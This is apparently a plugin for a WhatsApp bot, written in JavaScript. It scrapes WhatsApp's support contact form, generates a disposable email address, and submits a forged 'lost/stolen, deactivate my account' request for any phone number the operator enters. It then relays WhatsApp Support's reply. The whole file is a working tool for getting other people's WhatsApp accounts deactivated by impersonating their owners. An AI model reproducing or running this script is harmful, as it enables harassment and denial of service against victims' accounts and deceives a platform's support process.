import * as cheerio from 'cheerio'; 
import axios from 'axios';
import util from 'util';

let handler = async (message, { 
  conn, 
  isOwner, 
  usedPrefix, 
  command, 
  args 
}) => {
  const phoneNumber = args.join(" ");
  if (!phoneNumber || !args[0]) {
    throw "*ENTER THE NUMBER IN INTERNATIONAL FORMAT, EXAMPLE: +1 (915) 555-555*";
  }

  let response = await axios.get('https://www.whatsapp.com/contact/noclient/');
  let emailResponse = await axios.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=10");
  let cookies = response.headers["set-cookie"].join("; ");
  let $ = cheerio.load(response.data);
  let form = $("form");
  let actionUrl = new URL(form.attr('action'), "https://www.whatsapp.com").href;
  
  let formData = new URLSearchParams();
  formData.append('jazoest', form.find("input[name=jazoest]").val());
  formData.append('lsd', form.find("input[name=lsd]").val());
  formData.append("step", "submit");
  formData.append("country_selector", 'ID');
  formData.append("phone_number", phoneNumber);
  formData.append("email", emailResponse.data[0]);
  formData.append("email_confirm", emailResponse.data[0]);
  formData.append("platform", "ANDROID");
  formData.append("your_message", "Perdido/roubado: desative minha conta: " + phoneNumber);
  formData.append("__user", '0');
  formData.append('__a', '1');
  formData.append('__csr', '');
  formData.append("__req", '8');
  formData.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0");
  formData.append("dpr", '1');
  formData.append("__ccg", 'UNKNOWN');
  formData.append("__rev", "1006630858");
  formData.append("__comment_req", '0');

  let submitResponse = await axios({
    url: actionUrl,
    method: "POST",
    data: formData,
    headers: {
      'cookie': cookies
    }
  });

  let responseData = String(submitResponse.data);

  if (responseData.includes("\"payload\":true")) {
    message.reply("##- WhatsApp Support -##\n\nHi,\n\nThank you for your message.\n\nWe have deactivated your WhatsApp account. This means your account is temporarily disabled and will be automatically deleted in 30 days if you don't re-register the account. Please note: WhatsApp Customer Support cannot delete your account manually. During the lockdown period:\n\n• Your contacts on WhatsApp may still see your name and profile picture.\n\nAny messages your contacts may send to the account will remain in pending status for up to 30 days.\n\nIf you wish to recover your account, please re-register your account as soon as possible.Re-register your account by entering the 6-digit code, the code you receive by SMS or phone call. If you re-register If you have any other questions or concerns, please do not hesitate to contact us. We will be happy to help!");
  } else {
    if (responseData.includes("\"payload\":false")) {
      message.reply("##- WhatsApp Support -##\n\nHii:\n\nThank you for your message.\n\nTo proceed with your request, we need you to verify that this phone number belongs to you. Please send us documentation that allows us to verify that the number is your property, such as a copy of the telephone bill or service contract.\n\n Please make sure to enter your phone number in full international format. For more information on the international format, see this article.\n\nIf you have any other questions or concerns, please do not hesitate to contact us. We will be happy to help you..");
    } else {
      message.reply(util.format(JSON.parse(submitResponse.data.replace("for (;;);", ''))));
    }
  }
};

handler.command = /^(supportwa|swa|logout|support|deactivatewa|mandsupport)$/i;
handler.owner = true;

export default handler;
